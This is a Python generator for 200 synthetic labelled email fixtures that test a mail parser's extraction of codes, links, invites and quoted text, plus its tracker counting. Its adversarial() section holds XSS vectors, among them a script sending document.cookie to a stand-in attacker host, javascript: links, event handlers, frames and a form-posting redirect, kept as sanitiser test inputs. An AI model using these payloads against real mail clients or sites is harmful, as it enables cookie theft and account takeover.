#!/usr/bin/env python3
"""Generates fixtures/parse/*.eml (200 labelled messages) and their *.labels.json sidecars.

Every sender, domain and person is invented (example.net / example.com / example.org are reserved
for documentation, RFC 2606). No real mail is used. The generator is seeded, so the output is
byte-for-byte reproducible: `python3 fixtures/parse/generate.py` rewrites the same 200 files.

Label keys (sidecar NNN.labels.json):
  category      which family the message belongs to
  code          the expected login code, spaces and hyphens removed, or null
  links         the expected sign-in links (exact URLs), or []
  invite        null or {method, uid, summary, organizer, all_day, start_utc_ms|null, start_local|null, tzid|null}
  tracker_count remote images in the HTML part (each must be replaced and counted)
  quoted        null, or {kind: "text", marker, visible_contains, folded_contains},
                or {kind: "html", visible_contains, folded_contains}
  adversarial   true when the HTML carries script, handlers, javascript: links, frames and the like
"""
import json
import os
import random
from email.message import EmailMessage
from email.policy import SMTP
from email.utils import format_datetime
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
R = random.Random(20261107)
random.seed(20261107)  # the email library draws multipart boundaries from the global generator

BRANDS = ["Northwind Cloud", "Lumen Bank", "Postbox Example", "Harbor Pay", "Quill Docs", "Marlow Travel",
          "Tessel Health", "Orchard Pay", "Linea Supply", "Brightfield", "Kestrel VPN", "Mosaic Notes"]
DOMAINS = ["example.net", "example.com", "example.org", "mail.example.net", "accounts.example.com"]
PEOPLE = ["Ada Lindqvist", "Tomas Verbeke", "Noor Haddad", "Pia Kowalski", "Jonas Peeters", "Mira Okafor",
          "Elif Demir", "Luc Martens", "Sanne de Wit", "Yara Costa"]
BASE = datetime(2026, 11, 2, 9, 30, tzinfo=timezone.utc)

COUNTER = [0]
OUT = []


def pick(xs):
    return R.choice(xs)


def hexs(n):
    return "".join(R.choice("0123456789abcdef") for _ in range(n))


def dom():
    return pick(DOMAINS)


def addr(name=None):
    name = name or pick(PEOPLE)
    local = name.lower().replace(" ", ".")
    return name, f"{local}@{dom()}"


def code_value(kind):
    if kind == "d6":
        return "".join(R.choice("0123456789") for _ in range(6))
    if kind == "d4":
        return "".join(R.choice("0123456789") for _ in range(4))
    if kind == "d8":
        return "".join(R.choice("0123456789") for _ in range(8))
    if kind == "d5":
        return "".join(R.choice("0123456789") for _ in range(5))
    if kind == "a6":
        return "".join(R.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(6))
    raise ValueError(kind)


def display(code, style):
    """How the code appears in the text; the label stays the normalised form."""
    if style == "plain":
        return code
    if style == "dash" and len(code) == 6:
        return code[:3] + "-" + code[3:]
    if style == "space" and len(code) == 6:
        return code[:3] + " " + code[3:]
    if style == "space" and len(code) == 8:
        return code[:4] + " " + code[4:]
    if style == "g":
        return "G-" + code
    return code


def new_msg(subject, sender, to=None, date_off=None, mid_host=None):
    m = EmailMessage(policy=SMTP)
    m["From"] = f"{sender[0]} <{sender[1]}>" if sender[0] else sender[1]
    to = to or ("Assem Example", "assem@example.org")
    m["To"] = f"{to[0]} <{to[1]}>"
    m["Subject"] = subject
    when = BASE + timedelta(minutes=(date_off if date_off is not None else R.randint(0, 20000)))
    m["Date"] = format_datetime(when)
    m["Message-ID"] = f"<{hexs(16)}@{mid_host or dom()}>"
    return m


def remote_img(kind=None):
    host = pick(["cdn.example.net", "img.example.com", "track.example.org", "pixel.example.net"])
    url = f"{pick(['https', 'http'])}://{host}/{pick(['logo', 'banner', 'o', 'px', 'open'])}/{hexs(8)}.{pick(['png', 'gif', 'jpg'])}"
    kind = kind or R.randint(0, 5)
    if kind == 0:
        return f'<img src="{url}" width="1" height="1" alt="">'
    if kind == 1:
        return f"<img src='{url}' alt='logo' width='120'>"
    if kind == 2:
        return f'<IMG SRC="{url}" ALT="banner">'
    if kind == 3:
        return f'<img alt="x" src={url}>'
    if kind == 4:
        return f'<img src="//{url.split("://", 1)[1]}" width="1" height="1">'
    return f'<img width="1" height="1" style="display:none" src="{url}" srcset="{url} 2x">'


def wrap_html(inner, imgs, brand="Brand"):
    """imgs: list of <img> strings placed in header and footer. Returns html."""
    head = imgs[0] if imgs else ""
    foot = "".join(imgs[1:])
    return (
        '<!DOCTYPE html><html><head><meta charset="utf-8"><title>' + brand + "</title>"
        "<style>body{font-family:Helvetica,Arial,sans-serif;color:#222}.code{font-size:28px}</style></head>"
        '<body><table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center">'
        + head + "<h2>" + brand + "</h2>" + inner
        + '<p style="font-size:11px;color:#888">You receive this because of your account. '
        '<a href="https://example.net/unsubscribe?u=' + hexs(6) + '">Unsubscribe</a> | '
        '<a href="https://example.net/privacy">Privacy</a></p>' + foot + "</td></tr></table></body></html>"
    )


def finish(m, cat, code=None, links=None, invite=None, trackers=0, quoted=None, adversarial=False):
    COUNTER[0] += 1
    n = COUNTER[0]
    name = f"{n:03d}"
    with open(os.path.join(HERE, name + ".eml"), "wb") as f:
        f.write(m.as_bytes())
    labels = {
        "id": name, "category": cat, "code": code, "links": links or [], "invite": invite,
        "tracker_count": trackers, "quoted": quoted, "adversarial": adversarial,
    }
    with open(os.path.join(HERE, name + ".labels.json"), "w") as f:
        json.dump(labels, f, indent=1, ensure_ascii=False)
        f.write("\n")


def body_msg(m, text, html=None, cte=None):
    cte = cte or pick(["7bit", "quoted-printable", "base64"])
    if cte == "7bit" and text is not None and not text.isascii():
        cte = "quoted-printable"
    if text is not None and html is not None:
        m.set_content(text, cte=cte)
        m.add_alternative(html, subtype="html", cte=pick(["quoted-printable", "base64"]))
    elif html is not None:
        m.set_content(html, subtype="html", cte=pick(["quoted-printable", "base64"]))
    else:
        m.set_content(text, cte=cte)


# ---------- code messages ----------
EN_TEXT = [
    "Your {b} verification code is {c}. It expires in 10 minutes.\n\nIf you did not request it, ignore this message.",
    "{c} is your {b} security code. Do not share it with anyone.",
    "Use {c} to sign in to your {b} account.\n\nThis code is valid for 5 minutes.",
    "Hi,\n\nEnter this code to continue:\n\n    {c}\n\nIf you didn't try to sign in, you can safely ignore this email.\n\nThe {b} team",
    "Your one-time passcode (OTP): {c}\nIt can be used once and expires shortly.",
    "Your login PIN: {c}\nNever share your PIN. {b} will never ask for it.",
    "Confirm your email address by entering {c} in the app.\n\nThanks,\n{b}",
    "Here is your two-factor authentication code: {c}. Never share it with anyone.",
    "We received a request to access your {b} account.\n\nYour access code is: {c}\n\nThis code will expire in 15 minutes.",
]
FR_TEXT = [
    "Votre code de vérification {b} est {c}. Il expire dans 10 minutes.",
    "Code de sécurité : {c}\n\nNe le communiquez jamais à personne.",
    "Utilisez {c} pour vous connecter à votre compte {b}.",
]
NL_TEXT = [
    "Uw verificatiecode is {c}. Deze code verloopt over 10 minuten.",
    "Je eenmalige code voor {b}: {c}\n\nDeel deze code met niemand.",
    "Gebruik {c} om in te loggen bij {b}.",
]
DE_TEXT = [
    "Ihr Bestätigungscode lautet {c}. Er ist 10 Minuten gültig.",
    "Dein Anmeldecode für {b}: {c}\n\nGib ihn niemals weiter.",
]
SUBJECTS_EN = ["Your verification code", "{c} is your {b} code", "Sign in to {b}", "Security code for your account",
               "Your one-time code", "Confirm your login", "Your {b} sign-in code"]


def code_plain(n):
    for i in range(n):
        b = pick(BRANDS)
        c = code_value(pick(["d6", "d6", "d6", "d4", "d8", "a6", "d5"]))
        style = pick(["plain", "plain", "dash", "space", "g"]) if len(c) == 6 and c.isdigit() else "plain"
        if len(c) == 8:
            style = pick(["plain", "space"])
        shown = display(c, style)
        text = pick(EN_TEXT).format(b=b, c=shown)
        subj = pick(SUBJECTS_EN).format(b=b, c=c)
        m = new_msg(subj, (b, f"no-reply@{dom()}"))
        body_msg(m, text)
        finish(m, "code-plain", code=c)


def code_html(n):
    for i in range(n):
        b = pick(BRANDS)
        c = code_value(pick(["d6", "d6", "d4", "d8", "a6"]))
        shown = display(c, "plain")
        imgs = [remote_img() for _ in range(R.randint(0, 3))]
        inner = pick([
            f'<p>Your verification code is</p><p class="code" style="letter-spacing:6px"><strong>{shown}</strong></p><p>It expires in 10 minutes.</p>',
            f'<p>Use this code to sign in:</p><table><tr><td style="font-size:30px">{shown}</td></tr></table><p>Do not share it.</p>',
            f'<div>Security code: <span style="font-family:monospace;font-size:24px">{shown}</span></div>',
            f'<p>Enter <b>{shown}</b> to confirm your login to {b}.</p>',
        ])
        html = wrap_html(inner, imgs, b)
        m = new_msg(pick(SUBJECTS_EN).format(b=b, c=c), (b, f"security@{dom()}"))
        if R.random() < 0.5:
            body_msg(m, None, html)
        else:
            body_msg(m, f"Your {b} verification code is {shown}. It expires in 10 minutes.", html)
        finish(m, "code-html", code=c, trackers=len(imgs))


def code_subject(n):
    for i in range(n):
        b = pick(BRANDS)
        c = code_value("d6")
        m = new_msg(f"{c} is your {b} verification code", (b, f"verify@{dom()}"))
        body_msg(m, f"Hi,\n\nFinish signing in with the code in the subject line. It stays valid for 10 minutes.\n\n{b}")
        finish(m, "code-subject", code=c)


def code_i18n(n):
    pools = [FR_TEXT, NL_TEXT, DE_TEXT]
    subj = {0: "Votre code de vérification", 1: "Uw verificatiecode", 2: "Ihr Bestätigungscode"}
    for i in range(n):
        k = i % 3
        b = pick(BRANDS)
        c = code_value(pick(["d6", "d6", "d4", "d8"]))
        text = pick(pools[k]).format(b=b, c=c)
        m = new_msg(subj[k], (b, f"no-reply@{dom()}"))
        body_msg(m, text)
        finish(m, "code-i18n", code=c)


# ---------- links ----------
def link_url(kind):
    host = f"auth.{pick(['example.net', 'example.com', 'example.org'])}"
    t = hexs(24)
    return {
        "verify": f"https://{host}/verify?token={t}&email=assem%40example.org",
        "magic": f"https://{host}/magic-link/{t}",
        "login": f"https://{host}/login/callback?code={t}",
        "confirm": f"https://{host}/confirm-email/{t}",
        "activate": f"https://{host}/activate?key={t}",
    }[kind]


def link_only(n):
    for i in range(n):
        b = pick(BRANDS)
        kind = pick(["verify", "magic", "login", "confirm", "activate"])
        url = link_url(kind)
        anchor = {"verify": "Verify your email", "magic": "Sign in to " + b, "login": "Log in", "confirm": "Confirm my address",
                  "activate": "Activate your account"}[kind]
        imgs = [remote_img() for _ in range(R.randint(0, 2))]
        if R.random() < 0.5:
            html = wrap_html(f'<p>Click the button below to finish. The link works once.</p><p><a href="{url.replace("&", "&amp;")}" style="background:#06c;color:#fff">{anchor}</a></p>', imgs, b)
            m = new_msg(pick(["Verify your email", "Your sign-in link", "Confirm your account", "Activate your account"]), (b, f"hello@{dom()}"))
            body_msg(m, f"{anchor}: {url}\n\nThe link works once.", html)
            finish(m, "link-html", links=[url], trackers=len(imgs))
        else:
            m = new_msg(pick(["Your sign-in link", "Verify your email address", "Confirm your account"]), (b, f"hello@{dom()}"))
            body_msg(m, f"Hello,\n\n{anchor} by opening this link:\n\n{url}\n\nIf you did not ask for it, ignore this email.\n\nTo stop these emails visit https://example.net/unsubscribe?u={hexs(6)}")
            finish(m, "link-text", links=[url])


def code_and_link(n):
    for i in range(n):
        b = pick(BRANDS)
        c = code_value("d6")
        url = link_url(pick(["verify", "magic", "confirm"]))
        html = wrap_html(f'<p>Your code is <b>{c}</b>.</p><p>Or <a href="{url.replace("&", "&amp;")}">sign in with one click</a>.</p>', [remote_img()], b)
        m = new_msg(f"Your {b} sign-in code", (b, f"no-reply@{dom()}"))
        body_msg(m, f"Your code is {c}.\nOr sign in with one click: {url}", html)
        finish(m, "code-and-link", code=c, links=[url], trackers=1)


# ---------- negatives ----------
def neg_order(n):
    for i in range(n):
        b = pick(BRANDS)
        order = f"{R.randint(10000, 99999)}-{R.randint(10, 99)}"
        text = pick([
            f"Thanks for your order!\n\nOrder #{order} is confirmed.\nTotal: EUR {R.randint(20, 400)}.{R.randint(10, 99)}\nEstimated delivery: 12 November 2026.\n\nQuestions? Call 0{R.randint(400, 499)} {R.randint(10, 99)} {R.randint(10, 99)} {R.randint(10, 99)}.",
            f"Your order {order} has shipped.\nTracking number: 1Z{hexs(14).upper()}\nPostal code: {R.randint(1000, 9999)} Brussels\nProduct code {R.randint(100, 999)}-{R.randint(100, 999)} x 2",
            f"Reservation confirmed for 2 guests on 14 November 2026 at 19:30.\nReference {R.randint(100000, 999999)} (keep it for the front desk).",
        ])
        m = new_msg(pick(["Order confirmation", "Your order has shipped", "Reservation confirmed"]), (b, f"orders@{dom()}"))
        body_msg(m, text)
        finish(m, "neg-order")


def neg_invoice(n):
    for i in range(n):
        b = pick(BRANDS)
        inv = f"2026-{R.randint(1000, 1999)}"
        imgs = [remote_img() for _ in range(R.randint(0, 2))]
        html = wrap_html(f"<p>Invoice <b>{inv}</b> for EUR {R.randint(100, 9000)}.{R.randint(10, 99)} is due on 30 November 2026.</p><p>VAT 21%. IBAN BE68 5390 0754 7034. Payment reference {R.randint(100, 999)}/{R.randint(1000, 9999)}/{R.randint(10000, 99999)}.</p>", imgs, b)
        m = new_msg(f"Invoice {inv}", (b, f"billing@{dom()}"))
        body_msg(m, f"Invoice {inv} for EUR 1,250.00 is due on 30 November 2026.", html)
        finish(m, "neg-invoice", trackers=len(imgs))


def neg_newsletter(n):
    for i in range(n):
        b = pick(BRANDS)
        imgs = [remote_img() for _ in range(R.randint(1, 5))]
        html = wrap_html(f"<h3>November news</h3><p>Join 5000 readers. In 2026 we shipped 12 releases. Ten percent off until 30 November.</p><p>Book a call: +32 {R.randint(2, 9)} {R.randint(100, 999)} {R.randint(10, 99)} {R.randint(10, 99)}</p><p><a href='https://example.net/blog/{hexs(6)}'>Read more</a></p>", imgs, b)
        m = new_msg(pick(["Our November newsletter", "What's new this month", "Product updates"]), (b, f"news@{dom()}"))
        m["List-Unsubscribe"] = f"<https://example.net/unsubscribe?u={hexs(6)}>"
        body_msg(m, "November news. Read more at https://example.net/blog/abc123", html)
        finish(m, "neg-newsletter", trackers=len(imgs))


def neg_promo(n):
    for i in range(n):
        b = pick(BRANDS)
        promo = pick(["WELCOME20", "SAVE15", "WINTER2026", "FREESHIP", "7392"])
        text = pick([
            f"Use promo code {promo} at checkout to get 20% off.",
            f"Your discount code: {promo}. Valid until 30 November.",
            f"Redeem gift card code {R.randint(1000, 9999)} {R.randint(1000, 9999)} {R.randint(1000, 9999)} on our site.",
            f"Share your referral code {promo} and both of you save 10 euros.",
        ])
        m = new_msg(pick(["Your offer inside", "A gift for you", "20% off this week"]), (b, f"offers@{dom()}"))
        body_msg(m, f"Hi!\n\n{text}\n\nThe {b} team")
        finish(m, "neg-promo")


def neg_security(n):
    for i in range(n):
        b = pick(BRANDS)
        html = wrap_html(f'<p>We noticed a new sign in to your account from Chrome on a Mac at 14:32.</p><p>If this was you, no action is needed. If not, <a href="https://{dom()}/security/activity">review recent activity</a>.</p>', [remote_img()], b)
        m = new_msg("New sign-in to your account", (b, f"security@{dom()}"))
        body_msg(m, f"We noticed a new sign in to your account from Chrome on a Mac at 14:32. Review recent activity: https://{dom()}/security/activity", html)
        finish(m, "neg-security", trackers=1)


def neg_personal(n):
    texts = [
        "Hi Assem,\n\nThe meeting is in room 4821 at 15:00. Can you bring the signed copy? My number is 0470 12 34 56.\n\nTomas",
        "Hey,\n\nI booked the flight, confirmation code is in the attached PDF, not here. Landing 18:45 on 14 November.\n\nNoor",
        "Dear Assem,\n\nPlease find the code of conduct attached. Section 4 covers the new policy since 2025.\n\nBest, Pia",
        "Quick question: does ticket 884421 cover the login bug or is that another one?\n\nJonas",
        "We are 12 people now, the budget is 45000 euros and the deadline is 2026-12-01. Thoughts?\n\nMira",
        "Lunch at 12:30? The restaurant is at 215 Rue Example, 1050 Ixelles.\n\nLuc",
    ]
    for i in range(n):
        p = pick(PEOPLE)
        m = new_msg(pick(["Quick one", "Re: planning", "Tomorrow", "Question"]), addr(p))
        body_msg(m, texts[i % len(texts)])
        finish(m, "neg-personal")


# ---------- invites ----------
def fold(line):
    out = []
    while len(line.encode()) > 75:
        cut = 75
        out.append(line[:cut])
        line = " " + line[cut:]
    out.append(line)
    return "\r\n".join(out)


def ics(method, uid, summary, org, start, end, tz=None, allday=False, location=None, attendee=None, desc=None):
    L = ["BEGIN:VCALENDAR", "PRODID:-//Example Calendar//EN", "VERSION:2.0", f"METHOD:{method}", "BEGIN:VEVENT", f"UID:{uid}"]
    if allday:
        L.append(f"DTSTART;VALUE=DATE:{start.strftime('%Y%m%d')}")
        L.append(f"DTEND;VALUE=DATE:{end.strftime('%Y%m%d')}")
    elif tz:
        L.append(f"DTSTART;TZID={tz}:{start.strftime('%Y%m%dT%H%M%S')}")
        L.append(f"DTEND;TZID={tz}:{end.strftime('%Y%m%dT%H%M%S')}")
    else:
        L.append(f"DTSTART:{start.strftime('%Y%m%dT%H%M%SZ')}")
        L.append(f"DTEND:{end.strftime('%Y%m%dT%H%M%SZ')}")
    L.append(f"SUMMARY:{summary}")
    if location:
        L.append(f"LOCATION:{location}")
    L.append(f"ORGANIZER;CN={org[0]}:mailto:{org[1]}")
    if attendee:
        L.append(f"ATTENDEE;CN={attendee[0]};ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE:mailto:{attendee[1]}")
    if desc:
        L.append(f"DESCRIPTION:{desc}")
    L += ["STATUS:" + ("CANCELLED" if method == "CANCEL" else "CONFIRMED"), "SEQUENCE:0", "END:VEVENT", "END:VCALENDAR"]
    return "\r\n".join(fold(x) for x in L) + "\r\n"


def invites(n):
    plan = (["REQUEST-utc"] * 3 + ["REQUEST-tz"] * 4 + ["REQUEST-attach"] * 2 + ["CANCEL"] * 3 + ["REPLY"] * 3
            + ["REQUEST-allday"] * 2 + ["REQUEST-longdesc"] * 3)
    plan = plan[:n]
    for i, kind in enumerate(plan):
        org = addr()
        me = ("Assem Example", "assem@example.org")
        summary = pick(["Quarterly planning", "Design review", "Supplier call", "Board prep", "Team lunch", "Product sync"])
        uid = hexs(20) + "@" + dom()
        start = datetime(2026, 11, R.randint(9, 27), R.randint(8, 16), pick([0, 30]), 0)
        end = start + timedelta(hours=1)
        method = kind.split("-")[0]
        loc = pick(["Room Alpha", "Rue Example 12, Brussels", "https://meet.example.net/" + hexs(6), None])
        tz = "Europe/Brussels" if kind == "REQUEST-tz" else None
        allday = kind == "REQUEST-allday"
        if allday:
            end = start + timedelta(days=1)
        desc = ("Agenda: " + "review of the numbers and next steps; " * 6) if kind == "REQUEST-longdesc" else None
        body = ics(method, uid, summary, org, start, end, tz, allday, loc, me, desc)
        m = new_msg({"REQUEST": f"Invitation: {summary}", "CANCEL": f"Canceled: {summary}", "REPLY": f"Accepted: {summary}"}[method], org)
        m.set_content(f"{org[0]} invites you to {summary}.\n")
        if kind == "REQUEST-attach":
            m.add_attachment(body.encode(), maintype="application", subtype="ics", filename="invite.ics")
        else:
            m.add_attachment(body.encode(), maintype="text", subtype="calendar", params={"method": method, "charset": "UTF-8"}, disposition="inline")
        inv = {"method": method, "uid": uid, "summary": summary, "organizer": org[1], "all_day": allday,
               "start_utc_ms": None, "start_local": None, "tzid": None, "location": loc}
        if allday:
            inv["start_local"] = start.strftime("%Y-%m-%d")
        elif tz:
            inv["start_local"] = start.strftime("%Y-%m-%dT%H:%M:%S")
            inv["tzid"] = tz
        else:
            inv["start_utc_ms"] = int(start.replace(tzinfo=timezone.utc).timestamp() * 1000)
        finish(m, "invite", invite=inv)


# ---------- quoted ----------
REPLY_LINES = ["Thanks, that works for me.", "Agreed. Let's move ahead with the second option.", "I will send the figures tomorrow morning.",
               "Yes, please book it.", "Looks good, one small change in section 2."]
ORIG_LINES = ["Can you confirm the schedule for next week?", "Here are the three options we discussed.", "Please review the attached draft.",
              "Do you have the figures for the supplier quote?"]


def quoted_text(n):
    kinds = (["gmail-en"] * 4 + ["gmail-wrap"] * 2 + ["fr"] * 3 + ["nl"] * 2 + ["de"] * 1 + ["outlook"] * 3 + ["original"] * 2
             + ["bare"] * 2 + ["none-wrote"] * 2 + ["none-forward"] * 2 + ["none-gt"] * 1)
    kinds = kinds[:n]
    for kind in kinds:
        a = addr()
        reply = pick(REPLY_LINES) + " " + hexs(4)
        orig = pick(ORIG_LINES) + " " + hexs(4)
        stamp = "Mon, Nov 2, 2026 at 10:14 AM"
        quoted_block = "\n".join("> " + x for x in [orig, "", "Regards,", a[0]])
        marker = None
        if kind == "gmail-en":
            marker = f"On {stamp} {a[0]} <{a[1]}> wrote:"
            text = f"{reply}\n\n{marker}\n{quoted_block}\n"
        elif kind == "gmail-wrap":
            marker = f"On {stamp} {a[0]}"
            text = f"{reply}\n\n{marker}\n<{a[1]}> wrote:\n{quoted_block}\n"
        elif kind == "fr":
            marker = f"Le lun. 2 nov. 2026 à 10:14, {a[0]} <{a[1]}> a écrit :"
            text = f"{reply}\n\n{marker}\n{quoted_block}\n"
        elif kind == "nl":
            marker = f"Op ma 2 nov. 2026 om 10:14 schreef {a[0]} <{a[1]}>:"
            text = f"{reply}\n\n{marker}\n{quoted_block}\n"
        elif kind == "de":
            marker = f"Am 02.11.2026 um 10:14 schrieb {a[0]} <{a[1]}>:"
            text = f"{reply}\n\n{marker}\n{quoted_block}\n"
        elif kind == "outlook":
            marker = "________________________________"
            text = f"{reply}\n\n{marker}\nFrom: {a[0]} <{a[1]}>\nSent: Monday, November 2, 2026 10:14 AM\nTo: Assem Example\nSubject: Planning\n\n{orig}\n"
        elif kind == "original":
            marker = "-----Original Message-----"
            text = f"{reply}\n\n{marker}\nFrom: {a[0]} <{a[1]}>\nSent: 2 November 2026 10:14\nSubject: Planning\n\n{orig}\n"
        elif kind == "bare":
            marker = "> " + orig
            text = f"{reply}\n\n{marker}\n> \n> Regards,\n> {a[0]}\n"
        elif kind == "none-wrote":
            text = f"On Monday I wrote the plan and on Tuesday the team reviewed it.\n{reply}\nThe draft is in the shared folder.\n"
        elif kind == "none-forward":
            text = f"{reply}\n\n---------- Forwarded message ---------\nFrom: {a[0]} <{a[1]}>\nSubject: FYI\n\n{orig}\n"
        else:  # none-gt
            text = f"{reply}\nIf x > 5 then the supplier wins; if y >= 7 we stay. {orig}\n"
        m = new_msg("Re: Planning" if marker else "Planning", a)
        body_msg(m, text, cte=pick(["7bit", "quoted-printable"]))
        q = None
        if marker:
            q = {"kind": "text", "marker": marker, "visible_contains": reply, "folded_contains": orig}
        finish(m, "quoted-text" if marker else "quoted-none", quoted=q)


def quoted_html(n):
    for i in range(n):
        a = addr()
        reply = pick(REPLY_LINES) + " " + hexs(4)
        orig = pick(ORIG_LINES) + " " + hexs(4)
        imgs = [remote_img() for _ in range(R.randint(0, 2))]
        kind = i % 2
        if kind == 0:
            html = (f'<div dir="ltr">{reply}</div><br><div class="gmail_quote"><div dir="ltr" class="gmail_attr">On Mon, Nov 2, 2026 at 10:14 AM {a[0]} &lt;<a href="mailto:{a[1]}">{a[1]}</a>&gt; wrote:<br></div>'
                    f'<blockquote class="gmail_quote" style="margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex"><div dir="ltr">{orig}</div></blockquote></div>' + "".join(imgs))
        else:
            html = (f"<html><body><p>{reply}</p><hr><blockquote type='cite'><p>{orig}</p></blockquote>" + "".join(imgs) + "</body></html>")
        m = new_msg("Re: Planning", a)
        body_msg(m, f"{reply}\n\n> {orig}", html)
        finish(m, "quoted-html", trackers=len(imgs),
               quoted={"kind": "html", "visible_contains": reply, "folded_contains": orig})


# ---------- adversarial ----------
def adversarial(n):
    vectors = [
        '<script>fetch("https://evil.example.net/x?c="+document.cookie)</script>',
        '<img src="https://pixel.example.net/a.gif" onerror="alert(1)">',
        '<a href="javascript:alert(1)" onclick="steal()">Click</a>',
        '<iframe src="https://evil.example.net/frame"></iframe><object data="https://evil.example.net/o.swf"></object>',
        '<svg onload="alert(1)"><script>alert(2)</script></svg>',
        '<p style="background:url(https://track.example.net/bg.png)" onmouseover="x()">hover</p><table background="https://track.example.net/t.gif"><tr><td>x</td></tr></table>',
        '<scr<script>ipt>alert(1)</scr</script>ipt><a href="&#106;avascript:alert(1)">e</a>',
        '<link rel="stylesheet" href="https://evil.example.net/s.css"><meta http-equiv="refresh" content="0;url=https://evil.example.net"><base href="https://evil.example.net/"><form action="https://evil.example.net/post"><input name="p"></form>',
    ]
    for i in range(n):
        v = vectors[i % len(vectors)]
        extra = [remote_img(pick([0, 1, 2, 3])) for _ in range(R.randint(0, 2))]
        html = "<html><head><title>x</title></head><body><p>Hello, safe text " + hexs(4) + "</p>" + v + "".join(extra) + "<p>after</p></body></html>"
        n_remote = sum(1 for x in extra) + (1 if 'img src="https://pixel.example.net/a.gif"' in v else 0)
        m = new_msg("Weekly digest", (pick(BRANDS), f"digest@{dom()}"))
        body_msg(m, "Hello, safe text. after", html)
        finish(m, "adversarial", trackers=n_remote, adversarial=True)


def main():
    for f in os.listdir(HERE):
        if f.endswith(".eml") or f.endswith(".labels.json"):
            os.remove(os.path.join(HERE, f))
    code_plain(24)
    code_html(20)
    code_subject(6)
    code_i18n(14)
    link_only(14)
    code_and_link(8)
    neg_order(14)
    neg_invoice(8)
    neg_newsletter(12)
    neg_promo(8)
    neg_security(6)
    neg_personal(12)
    invites(20)
    quoted_text(26 - 4)
    quoted_html(4)
    adversarial(8)
    assert COUNTER[0] == 200, COUNTER[0]


if __name__ == "__main__":
    main()
